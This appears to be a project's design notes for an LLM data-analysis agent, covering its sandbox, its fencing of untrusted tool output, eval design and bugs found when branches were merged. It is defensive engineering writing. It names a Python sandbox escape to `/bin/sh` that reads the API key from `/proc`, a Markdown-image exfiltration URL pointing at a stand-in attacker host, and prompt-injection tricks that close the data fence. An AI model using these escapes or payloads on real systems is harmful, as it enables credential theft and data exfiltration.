# Design decisions and integration stories

These notes cover the project's major decisions. For each one: what was built, the alternative
that was considered and why it lost, and what would change at production scale (many tenants,
real warehouses, a paid SLA). The second half covers integration problems that only appeared
when independently built branches were merged. Those are the most instructive part of the
project.

Sources: [`architecture.md`](architecture.md) (what the code does),
[`review.md`](review.md) (the hostile review),
[`integration-notes.md`](integration-notes.md) (the six merge rounds),
[`sandbox.md`](sandbox.md) (the threat model).

---

## Part 1: Design decisions

### 1. A hand-written agent loop, not a framework

**Built.** About one file (`core/loop.py`) of explicit Plan → Execute → Verify → Revise over the
Messages API. State lives in one `AgentState` dataclass, and every step is one `on_event`
callback.

**Alternative: LangGraph, or an agent framework with built-in tool dispatch.** It was rejected
because what matters here *is* the control flow:

- budget degradation,
- the critic loop,
- the approval gate between `tool_use` and execution,
- escalation,
- answering every `tool_use` id even when the model submits twice (review M5).

In a framework each of those becomes a hook or a subclass. In our own loop each is a few lines in
one place, and that place is also the only one where model output turns into an action. That
makes it the obvious place for security review. Mocked-LLM tests are also trivial: `FakeLLM` has
one queue per role. (`CLAUDE.md` still allows LangGraph for state management alone.)

**At production scale.** Long-running jobs would need durable execution: checkpoint
`AgentState` after each turn, so that a pod restart resumes a job instead of failing it. Today
`mark_interrupted` fails it. Temporal or a LangGraph checkpointer earns its keep there. The loop
body would stay ours.

### 2. A separate critic, plus a deterministic check in front of it

**Built.** The critic is its own LLM call with its own prompt. It sees only the draft, the
executed SQL/code and the result tables, never the planner's reasoning. Its output is structured
(`pass | revise`, issues, suggested fix), and it gets at most two rounds by default
(`AGENT_MAX_CRITIC_ROUNDS`; `0` switches it off). With structured reports
on, `check_consistency()` runs first. It checks that every headline number is a key number and
that every key number appears in some tool output, and it feeds the mismatches to the critic.

**Alternative: self-verification in the planner** ("double-check your answer"). It was rejected
because a model rereading its own chain of thought tends to ratify it. A clean context and a
reviewer role catch wrong joins, double counting and unsupported claims more often.

**Second alternative: let the deterministic check block the report.** Also rejected. Formatting
(`$1.2M` vs `1234567.89`) and derived numbers make false positives inevitable. The check only
informs the critic and never vetoes.

**Known costs.** One extra call per round. The critic shares a model family with the planner,
so blind spots are correlated. It fails open on unparseable output, so a flaky critic cannot
wedge a run; that case is recorded as `completed_with_issues`.

**At production scale.**
- Run the critic on a different model family, or a cheaper model with sampled escalation.
- Track the critic's false-revise rate, i.e. how often it flips a correct answer, as an SLO.
- Skip the critic on L1 questions when the consistency check is clean.

### 3. Sandbox: a confined subprocess, with kernel layers added after review

**Built.** SQL runs on an in-memory DuckDB that is read-only and locked. It accepts only a
single-statement `SELECT`/`WITH`/`EXPLAIN` allowlist, double-checked by DuckDB's own parser, with
external access off. Python runs in a fresh interpreter per call. The child applies its own
rlimits, then installs **seccomp-bpf** (no exec, no fork, no sockets of any family, no ptrace,
signals only to itself, no rlimit, scheduler or file-metadata changes, no mounts or host-wide
syscalls) and **Landlock** (read only the libraries, write only the temp dir) right before
user code runs. Before that, an audit hook, an import allowlist and a scrubbed environment
already apply.

**Alternatives, and why they lost:**

- **Python-level guards only** (audit hook, import allowlist, socket patch). This was the
  original design, and the review broke it twice:
  - **H1:** `pd.io.common.os.sys.modules['_posixsubprocess'].fork_exec(...)` started `/bin/sh` as
    the service user. It needed no import and raised no audit event, and from there a shell could
    read `/proc/<api>/environ`, including `ANTHROPIC_API_KEY`.
  - **H2:** pyarrow's C++ I/O (`input_stream`, `to_parquet`) read and wrote any file, because it
    never raises the `open` audit event.

  The lesson: an in-interpreter guard is a speed bump, not a boundary. Anything native code can
  reach bypasses it.
- **A container or gVisor per call.** That is the right boundary for hostile multi-tenant use,
  but it means a container runtime inside the service container, cold starts on every
  `run_python`, and a deployment story Cloud Run does not offer. Kernel self-confinement gave the
  two missing guarantees (no exec, no arbitrary file I/O) at the cost of a few syscalls.
- **`preexec_fn` to set rlimits.** It was replaced: `preexec_fn` is documented as unsafe with
  threads, and the API calls `run_python` from a thread pool (review M7). The child now sets its
  own limits, and seccomp stops it from raising them.

**Then a fuzzer.** A grammar-based escape fuzzer (500 snippets combining attacks, module
routes, name encodings, path tricks and attacks on the Python guards, run with and without the
Python layer) found 38 more working attacks in eight classes. Among them: `connect()` to a
pathname `AF_UNIX` socket such as `docker.sock`, and `chmod`/`utimes`/xattrs on readable files,
because Landlock mediates neither; renicing other processes; and resetting the audit hook's
state through a traceback's `f_locals`. The filter grew from an allow-`AF_UNIX` rule to 115
instructions, and the fuzzer now runs nightly. The lesson matches H1/H2: each layer has blind
spots the next one has to cover, and only an attacker's-eye search finds them.

**Honest limits.** The child runs as the same Unix user. Some gaps are documented, not fixed:
file metadata (`stat`) is readable everywhere, and seccomp is a deny list. Landlock is best effort (kernels before
5.13 and some gVisor setups lack it, and the child says so on stderr). Kernel exploits are out of
scope.

**At production scale.**
- One Firecracker or gVisor sandbox per job, with `--network none`, and the current layers kept
  inside it as defence in depth.
- A separate UID per job.
- A read-only root filesystem.
- A warm pool to hide cold starts.
- Rate limits per tenant, because CPU fairness is not handled today.

### 4. DuckDB in-memory over the uploaded files

**Built.** Files are copied into a private DuckDB database, which is reopened read-only. Results
come back as 200 rows plus a total count, and the total is counted while streaming, never
materialised.

**Alternatives.**
- **pandas only:** no SQL for the model to write, which is its strongest language, and there is
  no cheap read-only story.
- **SQLite:** a weaker analytical dialect (window functions over dates, `QUALIFY`).
- **Querying the source directly:** there is no source; inputs are files.

DuckDB also gives a free cost estimate (`EXPLAIN`), which the approval gate uses.

**At production scale.** The sources become warehouses (BigQuery, Snowflake, Postgres) behind
the same `run_sql(query) -> SqlResult` contract. A read-only service account per tenant replaces
the read-only file. Warehouse dry-run byte estimates replace `EXPLAIN` rows in the approval gate,
and there is a per-query cost cap.

### 5. Tool output is fenced as untrusted data, and safety does not rely on the fence

**Built.** Every tool result goes into a `<tool_output … trust="untrusted">` fence. The system
prompt says that nothing inside it is an instruction. Delimiter look-alikes inside the data are
neutralised with a case- and whitespace-insensitive regex (review M1: `</TOOL_OUTPUT>` in a CSV
cell used to close the fence). The same wrapper guards the router's schema summary and the
critic's draft and tables; memory's `<prior_insights>` block uses the same neutralising rule
(`core/prompts.py:_neutralise_block`).

**Alternative: an injection classifier or output filter in front of the model.** It was rejected
as the *primary* control. It is another model that can be fooled, it adds latency to every tool
call, and it produces false positives on benign text. The fence is a mitigation. The guarantees
come from controls that hold even if the model obeys the injection: a read-only database, no
network, row caps, and a UI that will not render images from untrusted Markdown (review M2).
The ADV benchmark tier measures how well the mitigation works.

**At production scale.**
- A canary-token check on outputs.
- An egress proxy with an allowlist, even for the API process.
- PII redaction in the report layer with a real detector rather than regexes.
- Red-team the ADV set continuously, because it is small and in English.

### 6. Eval: generated ground truth, process isolation, offline CI gate

**Built.**
- **Benchmark.** 80 tasks over seeded synthetic data. The generator computes every expected
  value from the CSVs as written to disk, and a test regenerates everything byte for byte. Each
  L3 task investigates a planted pattern, and a guard aborts generation if the pattern stops
  holding.
- **Isolation.** Each task runs in a forkserver child in its own process group, and the whole
  group is killed on timeout.
- **CI.** No API calls. The oracle agent must score 100%, a dry run puts the real loop and
  sandbox behind a scripted LLM, and a second dry run turns on every flag except Langfuse and
  samples. A branch-coverage
  gate (overall, `sandbox/`, `core/loop.py`) and Hypothesis property tests guard the code paths
  the end-to-end runs do not reach.

**Alternatives.**
- **A public text-to-SQL benchmark** (Spider, BIRD). Single-query SQL only: no multi-step
  analysis, no adversarial data, no rubrics. It is also likely in the training data.
- **Hand-labelled answers.** Slow, and they drift when the data changes.
- **Threads with `asyncio.wait_for`.** That only stops *waiting*: the thread, its LLM calls and
  its sandbox subprocesses keep running and spending tokens.
- **A live eval in CI.** Costs money on every PR, is flaky (judge variance), and cannot run on
  forks without secrets. The offline gate catches pipeline breaks. Live evals are a deliberate,
  compared run (`eval compare`).

**At production scale.**
- A nightly live eval on main, with significance tests and repeated runs. With 16 to 24 tasks a
  tier (24 L1, 24 L2, 16 L3, 16 ADV), one task is 4 to 6.25 pp, so single runs are noise.
- A held-out task set kept out of the repository, against contamination.
- Real anonymised schemas.
- Judge calibration against human labels.
- The eval as a release gate for prompt-version bumps.

### 7. Model routing with failure-driven escalation

**Built.** One cheap classifier call (Haiku, low effort) labels the question L1/L2/L3 from the
question and a schema summary, and that picks the working model. The run escalates one tier on a
second critic `revise`, or when the same tool fails twice in a row. An escalation grants one
extra turn, because a retry that `max_turns` blocks is no retry.

**Alternatives.**
- **Always use the strongest model.** Simplest, and the right default; that is why routing is a
  flag.
- **Keyword heuristics.** Brittle across domains.
- **A cascade that always tries the cheap model first.** It pays twice on every hard question,
  and a confident wrong answer from the cheap model may never trigger the cascade.

**At production scale.** Train the router on logged traces, using routed tier vs final outcome,
which `eval report` already tabulates. Route on cost-per-correct-answer, not tier labels, and
cache router decisions for repeated question templates.

### 8. Human-in-the-loop as an approver interface on the gate

**Built.** `ApprovalPolicy` decides *whether* a call is gated: a large `EXPLAIN` estimate, any
`run_python`, or spend past a budget fraction. An `Approver` decides *what happens*, and there is
one per surface:

- CLI: a y/n prompt.
- API: `JobApprover` through `ApprovalBroker`, waiting on `POST /jobs/{id}/approve`, where a
  timeout counts as a deny.
- Eval: `AutoApprover`.

A denial goes back to the model as an error tool result, so it re-plans.

**Alternative: approve the whole plan up front.** Rejected, because the plan changes after every
tool result. The risky call is only known when it is about to run, and an estimate is only
possible then.

**Second alternative: block inside FastAPI's event loop.** Also rejected. The broker waits on
`asyncio.Event`s in a private event-loop thread, so agent worker threads and FastAPI never share
a loop.

**Review fix M6.** `EXPLAIN ANALYZE` *executes* its query, and a leading comment made the
estimate fail open. The policy now strips comments and gates on the inner query.

**At production scale.** Approvals would need to be durable (a job store row, not an in-process
`Event`), assignable to a role, audited, and resumable after a restart. Notifications would go
to Slack or email, and policy would be per tenant (row and byte thresholds, Python allowed or
not).

### 9. Feature flags, off by default, byte-identical when off

**Built.** These all ship behind an `AGENT_*_ENABLED` flag that defaults to false:

- routing
- the semantic layer
- structured reports
- memory
- approval
- samples
- Langfuse
- the trace store
- JSON logs

All settings live in one `Settings` class. `tests/test_config.py` fails if a field is missing
from the docs or from `.env.example`.

**Alternative: long-lived branches, or a config profile per deployment.** Branches rot (see Part
2), and profiles hide which feature caused a change. With per-feature flags, one commit can be
evaluated on and off. The off path keeps the old prompts and makes no extra calls, so it costs
nothing to carry.

**At production scale.** A flag service with per-tenant rollout and kill switches, and the flag
state recorded on every trace (`run_start.flags` already does this). Stale flags get deleted once
a feature wins its A/B.

### 10. Prompts are versioned code

**Built.** Each prompt is a `Prompt(name, version, text)` constant with a 12-character sha256.
`tests/test_prompts.py` pins version and fingerprint, so editing the text without a bump fails
CI. Versions go into every trace, every eval `meta.json` and every API job result, and
`eval compare` diffs them.

**Alternative: a prompt-management service** (Langfuse prompts, a database). It was rejected for
now because it splits one change across two systems, puts a network fetch on the hot path, and
lets prompts change without a code review or an eval run. Keeping prompts as per-run-value-free
constants also keeps the system prompt cacheable.

**At production scale.**
- Keep the source of truth in git and sync it *to* a registry for observability.
- Require an `eval compare` against the previous version in the PR for any bump.
- Allow canary prompts behind flags.

### 11. Tracing: our own span tree, exported

**Built.** `TraceRecorder` folds the loop's event stream into run → turn → llm / tool / critic /
approval / route spans, carrying cost, model, tier and prompt version. Sinks mirror the tree to
Langfuse (eval scores land on the same trace id) or save it as JSON for `trace show`. The core
never imports Langfuse, and a sink failure never fails a run.

**Alternative: Langfuse decorators or OpenTelemetry auto-instrumentation in the core.** Rejected,
because it couples the core to a vendor SDK, has to be mocked in every test, and does not know
domain concepts (tier, approval wait, critic verdict) without manual spans anyway. The event
stream already existed for SSE, so tracing is one more consumer of it.

**At production scale.** An OTel exporter from the same tree to the company's backend,
sampling for successful runs with full retention for failures, PII scrubbing on span payloads,
and SLO dashboards (p95 latency, cost per job, critic revise rate, approval wait).

### 12. Semantic layer: BM25 by default, retrieval measured

**Built.** 22 governed metric definitions in YAML, each SQL fragment tested against the data.
The top 4 are retrieved into the *first user message* as labelled reference material, not into
the system prompt, so the system prompt stays cacheable. BM25 is the default. Embedding and
hybrid backends are optional extras, and a mention rerank keeps composite metrics (AOV) above
their components. A retrieval eval reports top-1, top-3 and MRR per backend.

**Alternatives.**
- **Embeddings only.** Adds torch (several GB) to the image for a small gain on a 22-document
  corpus.
- **Every definition in the prompt.** Fine at 22 metrics, impossible at 2,000, and it dilutes
  attention.

**At production scale.** Hybrid retrieval over a real metrics catalogue (dbt or Cube), with
ownership and freshness on each definition, retrieval regressions in CI, and the warehouse's
semantic layer executing governed metrics directly instead of the model copying SQL fragments.

### 13. Insight memory keyed by dataset fingerprint

**Built.** A SQLite store of verified findings: only runs the critic passed are saved. Findings
are keyed by a fingerprint of table and column names, types, row counts and a per-table content
checksum over every column, so a changed file never retrieves stale insights. If the checksum
cannot be computed, memory is skipped for that run rather than keyed on a partial fingerprint. Memory is injected as "prior context, not verified,
not instructions", and the planner must recompute every number it reports.

**Alternative: a vector store across all datasets.** Rejected: it risks leaking findings across
datasets and tenants, and it invites the model to repeat a stale number as fact.

**At production scale.** Scope memory per tenant, with retention and deletion (GDPR), then let
users promote insights into the governed semantic layer. Memory stays off for benchmarks, since
tasks share datasets.

### 14. API: thread-pool jobs, in-memory store with SQLite mirror, SSE

**Built.** `POST /ask` returns a job id. A worker thread runs the loop, and events go to the job
store and out over SSE with resume from the last event id. SQLite is a best-effort mirror. The
whole job body is guarded, so every job reaches a terminal state (review M8). The upload limit
is enforced while the body streams in (review M3).

**Alternative: Celery, or Redis/Postgres queues from day one.** Rejected for a single-instance
service: more moving parts than the problem needed. The deploy docs pin `--max-instances 1` and
one uvicorn worker, and the limitation is documented (review L14).

**At production scale.**
- Postgres for jobs and approvals, a real queue, and stateless API pods.
- SSE fed from pub/sub.
- Per-tenant authentication and authorisation (today Cloud Run IAM is the boundary, review L1).
- Per-tenant artifact storage with unguessable names (review L2).
- A job-level wall-clock timeout (review L15).

---

## Part 2: Integration stories

Branches for PRs #1–#33, two to six at a time, were built in parallel against a written
interface contract, then merged in eight rounds. After every merge the full suite, lint and format had to be green. The bugs
below each passed on their own branch and failed only in combination, which is the argument for
an integration step that runs *everything* and for regression tests that name the original
finding.

### A. The forkserver child that read yesterday's environment

**What happened.** The hardening branch (#10) moved each eval task into a child process started
with `multiprocessing`'s **forkserver**, so a timeout could kill the whole process group. The
human-in-the-loop branch (#11) added `test_eval_auto_approves_gated_steps_by_default`, which
monkeypatches `AGENT_APPROVAL_ENABLED=true` and runs an eval. It passed alone and failed in the
full suite.

**Root cause.** A forkserver child is forked from the *fork server*, not from the parent. The
fork server is started once, by the first task in the process, and it keeps the environment it
had then. Any `AGENT_*` change made later was silently ignored by every subsequent task: a test's
monkeypatch, or a second `eval run` in the same process. On top of that, `get_settings()` was
`lru_cache`d during the fork server's preload, so even a correct environment would have produced
stale `Settings`.

**Fix.** `run_in_subprocess` snapshots `os.environ` at task start and passes it to the child.
The child clears its environment, applies the snapshot, and calls
`get_settings.cache_clear()` (`eval/isolation.py:_apply_env`).

**Lesson.** Process-start methods are part of your configuration semantics. "Works alone, fails
in the suite" is almost always shared or cached global state. A sibling bug from the same merge
round: #9's `make_core_agent` returned a closure, which the process isolation could not pickle,
so `eval run --routing` would have failed under the default `--isolation process`. It became a
frozen dataclass.

**At production scale.** Do not rely on inherited environments at all. Pass an explicit, typed,
serialised config to each worker, and record it in the run's metadata. `meta.json` already
records the config the run *asked* for. The real fix is to make that the only source.

### B. A human's "no" escalated to a more expensive model

**What happened.** Routing (#9) escalates to the next tier when the same tool errors on two
consecutive calls, on the theory that the cheaper model is stuck. HITL (#11) returns a denied
approval to the model as an *error tool result*, so the model re-plans. Merged together, a human
denying two `run_sql` calls in a row read as two consecutive `run_sql` failures, and the run
escalated to a stronger, pricier model. A human decision was being treated as model
incompetence, and the user paid for it.

**Fix.** Tool records that carry `data["approval"]` are skipped when counting consecutive
errors (`core/loop.py`). `test_human_denials_do_not_escalate` fails without the fix.
The README states "Human approval denials never escalate".

**Lesson.** When two features share a signal (here, "tool result with `ok=False`"), each branch's
tests prove its own reading of the signal. Only a combined test catches the collision. The fix
was to make the signal carry its *cause*. The flag-matrix tests, which run `ask --dry-run` over
all 64 combinations of routing × semantic layer × structured report × memory × approval mode,
exist because of this.

**At production scale.** Typed outcomes (`ToolError`, `PolicyDenied`, `HumanDenied`,
`Timeout`) instead of a boolean, with escalation and alerting policies keyed on the type. Also
track "denied then escalated" as a metric that should stay at zero.

### C. Security fixes regressed by branches written before them

The review branch (#17) fixed every High and Medium finding with a regression test. Five
feature branches had been written *before* it and were merged *after* it. Three of the fixes
came back.

1. **M2 reopened by the UI rewrite (#14).** M2 had made every Markdown image inert, because the
   viewer's browser fetches `![x](https://attacker/?d=…)` with no click. That made image URLs a
   zero-click exfiltration channel for anything the model could be steered to write. #14
   rewrote the UI to show charts inline. To do that it re-emitted `![alt](url)` for *any* image
   URL in the report that was not under `/artifacts/...`, which recreated the exact hole. The
   merge had no textual conflict on that line, and M2's test still passed, because it tested the
   old helper.

   **Fix.** `frontend/render.report_parts()` turns an image into a chart only when its URL is
   one of *this job's* `result.artifacts` and matches `/artifacts/<path>` (no `..`, no query).
   The UI then fetches it server-side. Every other image, inline or reference-style, stays inert
   text. The rule was applied to every Markdown surface #14 added (errors, approval reasons,
   key-number labels and values, dataset descriptions, column names), and the HTML timeline is
   escaped.

2. **M1's hole recreated in a new fence (#13).** M1 had made the `<tool_output>` fence
   case-insensitive. #13 added a new `<prior_insights>` block for memory, with its own
   neutraliser, which was case-sensitive: `</PRIOR_INSIGHTS>` in a stored insight would close
   it. No conflict, because it was new code repeating an old mistake. It now uses the same
   case- and whitespace-insensitive rule, with a test.

3. **M4 needed porting.** #13 moved `make_chart` into its own module, so #17's fix for M4 (the
   OO Matplotlib API instead of global pyplot state, `bins` bounded to 1..200, at most 10k
   points per series) landed in a function that no longer existed. Git applied it cleanly to the
   dead location. It was ported by hand.

**How they were caught.** After the merges, every finding in `review.md` was re-audited against
the merged tree: "still fixed?" and "where does the fix live now?" (see the audit table in
`integration-notes.md`). The sandbox fixes (H1/H2) were re-verified live inside an eval
forkserver child and through the real stdio MCP server, because those are different process
trees from the one the tests use.

**Lesson.** A security fix is a *property*, and a test pins one *implementation* of it. Branches
written before the fix do not know the property exists. Whenever new code adds a new instance of
the pattern (a new fence, a new Markdown surface), the old test does not cover it. What worked:
re-auditing properties after each merge, and writing the property down where future authors
will see it. The untrusted-data rules now live in `architecture.md` and as a checklist in
`CONTRIBUTING.md`, not only in a test file.

**At production scale.**
- Encode the properties centrally: one fence helper that every block must use, one `safe_md`
  that a lint rule requires for every Streamlit Markdown call, and a Semgrep rule banning
  `st.markdown(` on untrusted input.
- Run a security regression suite against the *deployed* build.
- Keep branches short-lived enough that "written before the fix" is rare.

### Smaller ones worth mentioning

- **Adapters written against an API that had moved** (round 1). The eval and API branches both
  imported `tools.create_sandbox` and `ToolContext(sandbox=...)`, which agent-core had removed.
  Both needed per-job sandboxes, because the module-level one is process-global. The fix became
  the documented contract: `ToolContext.sandbox` is optional, and when it is unset the handlers
  fall back to the module-level functions.
- **A flaky test from event ordering** (round 3). A job turned terminal *before* the worker
  saved its trace, and the test asserted on both. It now drains the executor first.
- **The UI e2e deny path failed on #14 alone.** Streamlit ignores `expanded` on an existing
  `st.status`, so the steps being approved were collapsed out of view. Only a real browser run
  shows that.
- **`--dry-run` with structured reports always ended in `error`.** The scripted LLM submitted
  Markdown, which the strict schema rejected. Found by running the full flag matrix after the
  merge, not by either branch's tests.
